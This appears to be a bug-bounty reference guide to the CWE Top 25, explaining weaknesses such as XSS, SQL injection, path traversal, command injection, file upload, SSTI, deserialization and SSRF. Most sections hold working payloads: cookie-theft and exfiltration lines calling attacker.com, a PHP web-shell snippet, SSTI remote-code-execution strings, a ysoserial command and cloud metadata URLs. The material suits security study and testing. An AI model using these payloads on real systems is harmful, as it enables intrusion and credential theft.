## Overview

The CWE Top 25 is compiled annually by MITRE using CVE data from the National Vulnerability Database (NVD). Each CWE is scored by combining how frequently it appears in real CVEs with the severity of those CVEs (CVSS weighting). This list represents the most impactful software weaknesses in the wild — not theoretical, not academic, based on actual exploitation data.

**Key difference from OWASP:** CWE is a weakness taxonomy (root causes), not a risk ranking of vulnerability categories. One CWE can manifest as many different vulnerability types. OWASP Top 10 maps multiple CWEs per category.

## Detailed Profiles — Bug Bounty Relevant CWEs

### CWE-79 — Cross-Site Scripting (XSS) [Rank #1]

**Full Name:** Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

**Variants:**
- **Reflected XSS** — malicious script in request reflected in response
- **Stored XSS** — malicious script persisted server-side
- **DOM-based XSS** — script manipulates DOM without server-side involvement

**Root Cause:** User-controlled data rendered as HTML/JS without proper output encoding.

**Attack Patterns:**
```html
<!-- Basic payload -->
<script>alert(document.domain)</script>

<!-- Attribute context escape -->
"><img src=x onerror=alert(1)>

<!-- JavaScript context -->
';alert(1)//

<!-- DOM XSS via location.hash -->
#<img src=x onerror=alert(document.cookie)>

<!-- Cookie theft chain -->
<script>fetch('https://attacker.com/?c='+document.cookie)</script>
```

**CVSS Impact Notes:** UI:R required for reflected XSS; UI:N for stored XSS that fires on page load. S:Changed when victim's security context differs from attacker's (browser same-origin). Typically Medium (5.4–6.1) for reflected; Medium-High (6.1–8.0) for stored.

**Bug Bounty Severity:** Reflected = Medium; Stored on admin panel = High; Stored with cookie theft + MFA bypass chain = Critical.

### CWE-787 — Out-of-Bounds Write [Rank #2]

**Full Name:** Out-of-bounds Write

**Description:** Software writes data past the end, or before the beginning, of the intended buffer. Leads to memory corruption, arbitrary code execution, or denial of service.

**Context:** Primary weakness in C/C++ software. Found in image parsers, document processors, network protocol implementations, kernel drivers.

**Bug Bounty Relevance:** Low for web apps. Relevant in:
- Native mobile app libraries
- IoT/embedded firmware
- Browser extensions written in native code
- WebAssembly modules
- Server-side image processing (libpng, libjpeg, FFmpeg CVEs)

**Example CVEs:** CVE-2023-44487 (HTTP/2 Rapid Reset, DoS), memory corruption in PDF parsers, browser sandbox escapes.

### CWE-89 — SQL Injection [Rank #3]

**Full Name:** Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

**Root Cause:** User input concatenated directly into SQL query without parameterization.

**Variants:**
- **In-band SQLi:** Error-based, union-based
- **Blind SQLi:** Boolean-based, time-based
- **Out-of-band SQLi:** DNS exfiltration (Oracle UTL_HTTP, MSSQL xp_dirtree)

**Classic Payloads:**
```sql
-- Detection
'
''
`
')
"))
-- or 1=1
-- or '1'='1

-- Error-based (MySQL)
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--

-- Union-based column enumeration
' ORDER BY 1--
' ORDER BY 2--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

-- MSSQL time-based blind
'; IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (SUBSTRING(user_name(),1,1)='s') WAITFOR DELAY '0:0:5'--

-- PostgreSQL
' OR pg_sleep(5)--
```

**CVSS Scoring:** Typically C:H (full DB read), I:H if DML possible, AV:N, PR:N, AC:L = 9.8 (Critical) in worst case.

### CWE-352 — Cross-Site Request Forgery (CSRF) [Rank #4]

**Full Name:** Cross-Site Request Forgery (CSRF)

**Root Cause:** Web app trusts requests made by authenticated browser without verifying that the user intended to make the request.

**Attack:** Malicious site causes victim's browser to send authenticated request to target app.

**Conditions for Exploitability:**
1. No CSRF token (or token not validated)
2. Cookie-based authentication (or Basic Auth)
3. No `SameSite` cookie attribute (or `SameSite=None`)
4. No `Referer` / `Origin` validation

**PoC Template:**
```html
<html>
<body onload="document.forms[0].submit()">
<form action="https://target.com/api/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="confirm" value="attacker@evil.com">
</form>
</body>
</html>
```

**JSON CSRF (Content-Type confusion):**
```html
<!-- If application accepts text/plain with JSON body -->
<form action="https://target.com/api/user" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","x"' value='": "y"}'>
</form>
```

**SameSite Bypass (Lax — GET requests):**
```html
<img src="https://target.com/api/logout">
<a href="https://target.com/admin/delete?id=123">Click me</a>
```

### CWE-22 — Path Traversal [Rank #5]

**Full Name:** Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

**Root Cause:** User-controlled path component not restricted to intended directory.

**Classic Payloads:**
```
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd  (double URL encoded)
..\/..\/..\/etc\/passwd  (Windows backslash)
....\/....\/....\/etc\/passwd
/etc/passwd%00.jpg  (null byte — PHP older versions)
```

**Targets:**
```
/etc/passwd, /etc/shadow, /etc/hosts
~/.ssh/id_rsa, ~/.bash_history
/proc/self/environ  (env vars with credentials)
/proc/self/cmdline  (running process command)
/app/config/database.yml
/var/www/html/.env
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
```

### CWE-78 — OS Command Injection [Rank #7]

**Full Name:** Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

**Root Cause:** User input incorporated into shell command execution without sanitization.

**Separators and Payloads:**
```bash
# Command separators
; whoami
&& whoami
|| whoami
| whoami
`whoami`    (backtick)
$(whoami)   (command substitution)

# Blind — out-of-band detection
; nslookup $(whoami).attacker.com
; curl http://attacker.com/?x=$(id|base64)
; ping -c1 attacker.com

# Time-based blind
; sleep 5
& timeout /t 5    (Windows)

# Windows-specific
& whoami
| whoami
&& whoami
; whoami  (sometimes)
%0awhoami  (newline injection)
```

### CWE-862 — Missing Authorization [Rank #9]

**Full Name:** Missing Authorization

**Root Cause:** Software does not perform authorization check when it should. Distinct from CWE-863 (incorrect authorization logic present but wrong).

**Bug Bounty Manifestation:**
- IDOR: API endpoint performs action without verifying user owns the object
- BFLA: Admin endpoint accessible to regular users
- Method-based access control missing (GET checked, DELETE not)
- Version-based: v2 has auth check, v1 does not

**Relationship to OWASP:** Maps directly to A01:2021 Broken Access Control (most common OWASP category).

### CWE-434 — Unrestricted File Upload [Rank #10]

**Full Name:** Unrestricted Upload of File with Dangerous Type

**Attack Chain:** Upload web shell → Remote Code Execution

**Bypass Techniques:**
```
# Extension bypass
.php → .php5, .phtml, .phar, .php3, .php4, .shtml
.jsp → .jspx, .jsw, .jsv, .jspf
.asp → .aspx, .asa, .asax, .ascx, .ashx

# MIME type bypass
Content-Type: image/jpeg  (but actual content is PHP)

# Double extension
shell.jpg.php
shell.php%00.jpg  (null byte, older PHP)
shell.php .jpg  (trailing space/dot, Windows)

# Magic bytes bypass
Add GIF89a; to beginning of PHP webshell → appears to be GIF
<?php system($_GET['cmd']); ?>  after GIF header

# Polyglot
Combine valid JPEG header + PHP payload = valid image + executable PHP

# .htaccess upload (Apache)
Upload .htaccess with: AddType application/x-httpd-php .jpg
Then upload evil.jpg = PHP web shell

# SVG XSS
<svg><script>alert(document.cookie)</script></svg>
Upload as image/svg+xml → Stored XSS
```

### CWE-94 — Code Injection / SSTI [Rank #11]

**Full Name:** Improper Control of Generation of Code ('Code Injection')

**Includes:** SSTI (Server-Side Template Injection), OGNL Injection, Expression Language Injection

**SSTI Detection:**
```
{{7*7}} → 49 (Jinja2/Twig)
${7*7} → 49 (FreeMarker/Velocity/EL)
<%= 7*7 %> → 49 (ERB)
#{7*7} → 49 (Pug)
*{7*7} → 49 (Spring SpEL)
```

**SSTI → RCE (Jinja2):**
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
```

### CWE-287 — Improper Authentication [Rank #14]

**Full Name:** Improper Authentication

**Root Cause:** Application does not sufficiently verify identity of user.

**Bug Bounty Manifestations:**
- Password reset with predictable token
- 2FA bypass via response manipulation
- Authentication bypass via JWT manipulation (alg:none, weak secret)
- Direct API calls bypassing authentication middleware
- Session fixation (attacker-set session ID accepted after login)
- Password reset token not expiring after use

### CWE-502 — Deserialization of Untrusted Data [Rank #16]

**Full Name:** Deserialization of Untrusted Data

**Languages/Formats Affected:** Java (native serialization, XStream, Jackson), PHP (`unserialize()`), Python (pickle), Ruby (Marshal), .NET (BinaryFormatter), YAML, XML

**Java Deserialization — Detection:**
```
# Binary: starts with AC ED 00 05 (hex) → Java serialized object
# Base64: rO0AB → rO0ABVs... (Base64 of AC ED 00 05)

# Test endpoints that accept serialized data:
- ViewState in ASP.NET
- Cookies with serialized objects
- POST bodies with Java serialization MIME types
- JMX/RMI endpoints
```

**Java RCE via ysoserial:**
```bash
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/?x=$(id)' | base64
# POST this as the deserialized payload
```

**PHP unserialize() — Property Injection:**
```php
# Crafted serialized string
O:4:"User":2:{s:4:"name";s:5:"admin";s:6:"is_admin";b:1;}
# Deserializes to User object with is_admin=true
```

### CWE-918 — SSRF [Rank #19]

**Full Name:** Server-Side Request Forgery (SSRF)

**Root Cause:** Server makes HTTP request to attacker-controlled URL without validation.

See also: OWASP A10:2021, API7:2023 for full SSRF details.

**Critical Impact:** AWS IMDS access via SSRF → IAM credential theft → full cloud account compromise.

```
# AWS IMDS
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE
# GCP IMDS
http://169.254.169.254/computeMetadata/v1/?recursive=true (Header: Metadata-Flavor: Google)
# Azure IMDS
http://169.254.169.254/metadata/identity/oauth2/token?... (Header: Metadata: true)
```

### CWE-798 — Hardcoded Credentials [Rank #22]

**Full Name:** Use of Hard-coded Credentials

**Discovery Locations:**
- JavaScript bundles (grep for `key`, `secret`, `token`, `password`)
- Mobile app decompilation
- `.env` files committed to git / exposed on web
- Docker image layers
- CI/CD pipeline logs
- Error responses with environment variable dumps
- API documentation with real examples

**Tools:**
```bash
trufflehog git https://github.com/target/repo
gitleaks detect --source /path/to/repo
# Search in live JS
curl https://target.com/bundle.js | grep -iE "api[_-]?key|secret|password|token" | head -20
```

## Historical Trend — CWEs Rising vs Falling

**Rising (newly entered or moved up 2022→2024):**
- CWE-862 Missing Authorization (from #11 to #9) — IDOR/BFLA prevalence increasing in web apps
- CWE-918 SSRF (from #12 to #19, dropped slightly but stable) — cloud environments amplify impact
- CWE-94 Code Injection (from #17 to #11) — SSTI finding prevalence rising
- CWE-400 Resource Consumption (new in top 25) — DoS/rate limiting findings increasing

**Consistently High:**
- CWE-79 XSS — #1 for multiple years running, highest frequency
- CWE-89 SQLi — stable top 5, high severity amplifies score
- CWE-787 OOB Write — native code, pervasive in C/C++ software

**Declining or Dropped:**
- CWE-125 OOB Read (fell from #5 to #6)
- CWE-119 Buffer Overflow (from #17 to #21) — memory-safe languages reducing prevalence

## Using CWE in Bug Bounty Reports

Always include the CWE ID in your vulnerability report. Triage teams are trained to recognize CWE IDs and it improves report quality:

```
## Vulnerability Details

**Type:** SQL Injection  
**CWE:** CWE-89 (Improper Neutralization of Special Elements used in SQL Commands)  
**OWASP:** A03:2021 Injection  
**CVSS 3.1:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)  
**CWE Vector:** Time-based blind SQLi in unauthenticated endpoint
```

This triple-mapping (CWE + OWASP + CVSS) demonstrates technical depth and helps programs route the report to the right specialist.
